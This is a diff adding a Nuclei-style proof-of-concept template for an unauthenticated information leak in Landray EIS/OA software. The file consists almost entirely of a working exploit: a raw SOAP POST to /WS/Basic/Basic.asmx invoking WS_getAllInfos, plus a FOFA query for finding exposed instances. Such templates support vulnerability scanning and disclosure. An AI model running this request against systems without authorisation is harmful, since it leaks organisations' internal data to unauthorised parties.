@@ -1,0 +1,38 @@
+id: poc-gsz75hd3so81kyzt
+info:
+  name: 蓝凌OA Basic存在未授权信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gsz75hd3so81kyzt'
+  tags: info-leak,unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gsz75hd3so81kyzt
+    fofa: app="Landray-EIS智慧协同平台"
+http:
+- raw:
+  - 'POST /WS/Basic/Basic.asmx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: text/xml
+
+    Content-Length: 249
+
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <tem:WS_getAllInfos/>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
